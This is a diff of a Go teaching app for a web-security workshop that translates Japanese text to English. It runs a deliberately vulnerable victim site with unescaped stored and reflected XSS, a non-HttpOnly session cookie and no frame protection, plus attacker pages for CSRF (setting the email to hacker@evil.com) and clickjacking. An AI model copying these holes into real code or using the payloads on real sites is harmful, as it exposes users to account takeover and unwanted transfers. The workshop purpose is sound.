@@ -7,7 +7,7 @@ import (
 	"sync"
 )
 
-// デモ用のインメモリデータ
+// In-memory data for demo
 type Data struct {
 	sync.Mutex
 	Comments []string
@@ -15,22 +15,21 @@ type Data struct {
 }
 
 var data = &Data{
-	Comments: []string{"ワークショップへようこそ！"},
+	Comments: []string{"Welcome to the workshop!"},
 	Email:    "victim@example.com",
 }
 
 func main() {
 	mux := http.NewServeMux()
 
-	// 被害者サイト (Victim Site)
+	// Victim Site
 	mux.HandleFunc("/", homeHandler)
-	mux.HandleFunc("/login", loginHandler)
 	mux.HandleFunc("/xss/stored", storedXSSHandler)
 	mux.HandleFunc("/xss/reflected", reflectedXSSHandler)
 	mux.HandleFunc("/update-email", updateEmailHandler)
 	mux.HandleFunc("/transfer", transferHandler)
 
-	// 攻撃者サイト (Attacker Site)
+	// Attacker Site
 	mux.HandleFunc("/attacker/csrf", attackerCSRFHandler)
 	mux.HandleFunc("/attacker/clickjacking", attackerClickjackingHandler)
 
@@ -41,32 +40,23 @@ func main() {
 func homeHandler(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
 	fmt.Fprintf(w, `
-		<h1>被害者サイト (Victim Site)</h1>
-		<p>現在のメールアドレス: <strong>%s</strong></p>
+		<h1>Victim Site</h1>
+		<p>Current email: <strong>%s</strong></p>
 		<ul>
-			<li><a href="/login">ログイン (セッションCookieをセット)</a></li>
-			<li><a href="/xss/stored">格納型 XSS デモ</a></li>
-			<li><a href="/xss/reflected?q=test">反射型 XSS デモ</a></li>
-			<li><a href="/transfer">送金ページ (クリックジャッキングデモ用)</a></li>
+			<li><button onclick="alert(document.cookie)">Show Cookie</button></li>
+			<li><button onclick="document.cookie='session_id=secret-session-123; path=/'; alert('Logged in! Cookie has been set.')">Login (set session cookie)</button></li>
+			<li><button onclick="document.cookie='session_id=; path=/; max-age=0'; alert('Logged out. Cookie has been cleared.')">Logoff (clear session cookie)</button></li>
+			<li><a href="/xss/stored">Stored XSS Demo</a></li>
+			<li><a href="/xss/reflected?q=test">Reflected XSS Demo</a></li>
+			<li><a href="/transfer">Transfer Page (Clickjacking Demo)</a></li>
 		</ul>
 		<hr>
-		<h2>攻撃者サイトへのリンク (演習用)</h2>
+		<h2>Links to Attacker Site (for exercises)</h2>
 		<ul>
-			<li><a href="/attacker/csrf">CSRF 攻撃ページ</a></li>
-			<li><a href="/attacker/clickjacking">クリックジャッキング 攻撃ページ</a></li>
+			<li><a href="/attacker/csrf">CSRF Attack Page</a></li>
+			<li><a href="/attacker/clickjacking">Clickjacking Attack Page</a></li>
 		</ul>
 	`, data.Email)
-}
-
-func loginHandler(w http.ResponseWriter, r *http.Request) {
-	// CSRFを可能にするため、SameSite属性を制限しない (None/Laxの隙を突く)
-	http.SetCookie(w, &http.Cookie{
-		Name:     "session_id",
-		Value:    "secret-session-123",
-		Path:     "/",
-		HttpOnly: false, // XSSによるCookie奪取をデモするため false
-	})
-	fmt.Fprintf(w, "ログインしました！Cookieがセットされました。<a href='/'>ホームへ戻る</a>")
 }
 
 func storedXSSHandler(w http.ResponseWriter, r *http.Request) {
@@ -81,26 +71,26 @@ func storedXSSHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
-	fmt.Fprint(w, "<h1>格納型 XSS</h1>")
-	fmt.Fprint(w, "<p>入力した内容がそのまま保存され、表示されます。</p>")
-	fmt.Fprint(w, "<form method='POST'><input name='comment' style='width:300px'><input type='submit' value='投稿'></form>")
-	fmt.Fprint(w, "<h2>コメント一覧</h2><ul>")
+	fmt.Fprint(w, "<h1>Stored XSS</h1>")
+	fmt.Fprint(w, "<p>Submitted content is stored and displayed as-is.</p>")
+	fmt.Fprint(w, "<form method='POST'><input name='comment' style='width:300px'><input type='submit' value='Submit'></form>")
+	fmt.Fprint(w, "<h2>Comments</h2><ul>")
 	for _, c := range data.Comments {
-		// 脆弱性: ユーザー入力をエスケープせずにそのまま出力
+		// Vulnerability: user input is rendered unescaped
 		fmt.Fprintf(w, "<li>%s</li>", c)
 	}
-	fmt.Fprint(w, "</ul><a href='/'>ホームへ戻る</a>")
+	fmt.Fprint(w, "</ul><a href='/'>Back to home</a>")
 }
 
 func reflectedXSSHandler(w http.ResponseWriter, r *http.Request) {
 	q := r.URL.Query().Get("q")
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
-	// 脆弱性: クエリパラメータをそのままHTMLに埋め込み
-	fmt.Fprintf(w, "<h1>検索結果</h1><p>「%s」の検索結果は0件です。</p><a href='/'>ホームへ戻る</a>", q)
+	// Vulnerability: query parameter is embedded directly into HTML
+	fmt.Fprintf(w, "<h1>Search Results</h1><p>0 results found for \"%s\".</p><a href='/'>Back to home</a>", q)
 }
 
 func updateEmailHandler(w http.ResponseWriter, r *http.Request) {
-	// 簡易的な「認証」チェック
+	// Simplified "authentication" check
 	cookie, err := r.Cookie("session_id")
 	if err != nil || cookie.Value != "secret-session-123" {
 		http.Error(w, "Unauthorized", http.StatusUnauthorized)
@@ -113,16 +103,16 @@ func updateEmailHandler(w http.ResponseWriter, r *http.Request) {
 		data.Email = newEmail
 		data.Unlock()
 		w.Header().Set("Content-Type", "text/html; charset=utf-8")
-		fmt.Fprintf(w, "メールアドレスを <strong>%s</strong> に更新しました。<a href='/'>ホームへ戻る</a>", newEmail)
+		fmt.Fprintf(w, "Email updated to <strong>%s</strong>. <a href='/'>Back to home</a>", newEmail)
 		return
 	}
 
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
 	fmt.Fprintf(w, `
-		<h1>メールアドレス更新</h1>
+		<h1>Update Email</h1>
 		<form method="POST">
-			新しいメールアドレス: <input name="email" value="%s">
-			<input type="submit" value="更新">
+			New email: <input name="email" value="%s">
+			<input type="submit" value="Update">
 		</form>
 	`, data.Email)
 }
@@ -130,35 +120,35 @@ func updateEmailHandler(w http.ResponseWriter, r *http.Request) {
 func transferHandler(w http.ResponseWriter, r *http.Request) {
 	if r.Method == http.MethodPost {
 		w.Header().Set("Content-Type", "text/html; charset=utf-8")
-		fmt.Fprintf(w, "<h2>💰 $1000 の送金が完了しました！</h2><a href='/'>ホームへ戻る</a>")
+		fmt.Fprintf(w, "<h2>Transfer of $1000 completed!</h2><a href='/'>Back to home</a>")
 		return
 	}
 
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
-	// 脆弱性: X-Frame-Options ヘッダーがないため、他サイトの iframe 内で表示可能
+	// Vulnerability: no X-Frame-Options header, allowing iframe embedding from other sites
 	fmt.Fprintf(w, `
 		<style>
 			body { font-family: sans-serif; text-align: center; padding-top: 50px; }
 			.btn { background: #ff4444; color: white; padding: 20px 40px; border: none; font-size: 20px; cursor: pointer; border-radius: 5px; }
 		</style>
-		<h1>送金確認</h1>
-		<p>「悪意のあるハッカー」へ <strong>$1000</strong> を送金しますか？</p>
+		<h1>Transfer Confirmation</h1>
+		<p>Send <strong>$1000</strong> to "Malicious Hacker"?</p>
 		<form method="POST">
-			<button class="btn">送金を確定する</button>
+			<button class="btn">Confirm Transfer</button>
 		</form>
 	`)
 }
 
-// --- 攻撃者サイトのエンドポイント ---
+// --- Attacker Site Endpoints ---
 
 func attackerCSRFHandler(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
 	fmt.Fprintf(w, `
-		<h1 style="color:red">おめでとうございます！賞品に当選しました！</h1>
-		<p>以下のボタンを押して、豪華賞品を受け取ってください！</p>
+		<h1 style="color:red">Congratulations! You won a prize!</h1>
+		<p>Press the button below to claim your reward!</p>
 		<form action="http://localhost:8080/update-email" method="POST">
 			<input type="hidden" name="email" value="hacker@evil.com">
-			<input type="submit" value="賞品を受け取る" style="padding:10px 20px; font-size:18px">
+			<input type="submit" value="Claim Prize" style="padding:10px 20px; font-size:18px">
 		</form>
 	`)
 }
@@ -173,7 +163,7 @@ func attackerClickjackingHandler(w http.ResponseWriter, r *http.Request) {
 				position: absolute;
 				top: 0;
 				left: 0;
-				opacity: 0.4; /* 実演用に半透明にしています。本物の攻撃では 0.0 にします */
+				opacity: 0.4; /* Semi-transparent for demo; real attack uses 0.0 */
 				z-index: 2;
 			}
 			#fake-page {
@@ -198,8 +188,8 @@ func attackerClickjackingHandler(w http.ResponseWriter, r *http.Request) {
 			}
 		</style>
 		<div id="fake-page">
-			<h1>🍪 無料クッキー配布中！</h1>
-			<p>下の大きなボタンを押して、今すぐクッキーをゲットしよう！</p>
+			<h1>Free Cookies Giveaway!</h1>
+			<p>Press the big button below to get free cookies now!</p>
 			<button class="fake-btn">GET COOKIES</button>
 		</div>
 		<iframe id="victim-frame" src="http://localhost:8080/transfer"></iframe>
